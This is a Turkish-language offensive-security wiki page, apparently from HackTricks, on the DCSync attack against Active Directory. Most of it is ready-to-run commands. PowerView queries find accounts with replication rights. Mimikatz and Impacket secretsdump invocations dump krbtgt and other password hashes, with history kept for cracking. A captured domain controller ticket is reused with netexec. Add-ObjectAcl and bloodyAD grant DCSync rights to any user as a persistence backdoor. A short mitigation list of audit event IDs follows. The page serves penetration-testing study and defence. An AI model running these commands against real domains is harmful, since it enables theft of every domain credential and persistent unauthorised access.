# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

**DCSync** izni, domain'in kendisi üzerinde şu izinlere sahip olmayı ifade eder: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** ve **Replicating Directory Changes In Filtered Set**.

**DCSync hakkında önemli notlar:**

- **DCSync attack, bir Domain Controller’ın davranışını simüle eder ve diğer Domain Controller’lardan Directory Replication Service Remote Protocol (MS-DRSR) kullanarak bilgi çoğaltmalarını ister**. MS-DRSR, Active Directory’nin geçerli ve gerekli bir işlevi olduğu için kapatılamaz veya devre dışı bırakılamaz.
- Varsayılan olarak yalnızca **Domain Admins, Enterprise Admins, Administrators ve Domain Controllers** grupları gerekli ayrıcalıklara sahiptir.
- Pratikte, **full DCSync** için domain naming context üzerinde **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** gerekir. `DS-Replication-Get-Changes-In-Filtered-Set` genellikle bunlarla birlikte delegate edilir, ancak tek başına daha çok **confidential / RODC-filtered attributes** (örneğin legacy LAPS-style secrets) senkronizasyonu için önemlidir; tam bir krbtgt dump için daha az kritiktir.
- Eğer herhangi bir account password reversible encryption ile saklanıyorsa, Mimikatz'ta password'u clear text olarak döndürmek için bir option mevcuttur

### Enumeration

Bu permissions'a sahip olanları `powerview` kullanarak kontrol edin:
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
DCSync haklarına sahip **varsayılan olmayan principals** üzerine odaklanmak istiyorsanız, yerleşik replication-capable grupları filtreleyin ve yalnızca beklenmeyen trustees inceleyin:
```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
Where-Object {
$_.ObjectType -match 'replication-get' -or
$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
} |
Where-Object { $_.IdentityReference -notmatch $default } |
Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```
### Yerelde Exploit Et
```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Uzaktan Exploit Etme
```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```
Pratik kapsamlı örnekler:
```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```
### Yakalanmış bir DC machine TGT (ccache) kullanarak DCSync

Unconstrained-delegation export-mode senaryolarında, bir Domain Controller machine TGT yakalayabilirsiniz (örn. `DC1$@DOMAIN` için `krbtgt@DOMAIN`). Ardından bu ccache'i DC olarak authenticate olmak ve password olmadan DCSync gerçekleştirmek için kullanabilirsiniz.
```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Operasyon notları:

- **Impacket'in Kerberos yolu, DRSUAPI çağrısından önce SMB'ye dokunur**. Ortam **SPN target name validation** zorunlu kılıyorsa, tam bir dump şu hata ile başarısız olabilir: `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- Bu durumda, önce hedef DC için bir **`cifs/<dc>`** service ticket isteyin ya da hemen ihtiyaç duyduğunuz hesap için **`-just-dc-user`** kullanın.
- Yalnızca daha düşük replication rights'a sahipseniz, LDAP/DirSync tarzı syncing yine de tam bir krbtgt replication olmadan **confidential** veya **RODC-filtered** attributes'u (örneğin legacy `ms-Mcs-AdmPwd`) açığa çıkarabilir.

`-just-dc` 3 dosya oluşturur:

- biri **NTLM hashes** için
- biri **Kerberos keys** için
- biri de [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) etkin olan hesaplar için NTDS'den cleartext passwords içindir. Reversible encryption açık kullanıcıları şu şekilde bulabilirsiniz:

```bash
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistence

Eğer bir domain admin iseniz, `powerview` yardımıyla bu permissions'u herhangi bir kullanıcıya verebilirsiniz:
```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Linux operatörleri de `bloodyAD` ile aynısını yapabilir:
```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```
Sonra, (özniteliklerin adlarını "ObjectType" alanı içinde görebilmelisiniz) çıktısında bunları arayarak kullanıcının 3 ayrıcalığa doğru şekilde atanıp atanmadığını **kontrol edebilirsiniz**:
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Mitigation

- Security Event ID 4662 (Audit Policy for object must be enabled) – Bir nesne üzerinde bir işlem gerçekleştirildi
- Security Event ID 5136 (Audit Policy for object must be enabled) – Bir directory service nesnesi değiştirildi
- Security Event ID 4670 (Audit Policy for object must be enabled) – Bir nesnedeki izinler değiştirildi
- AD ACL Scanner - ACL'lerin create ve compare create raporlarını oluşturun ve karşılaştırın. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [https://github.com/fortra/impacket/blob/master/ChangeLog.md](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [https://simondotsh.com/infosec/2022/07/11/dirsync.html](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)
- HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA: https://0xdf.gitlab.io/2025/09/12/htb-delegate.html

{{#include ../../banners/hacktricks-training.md}}
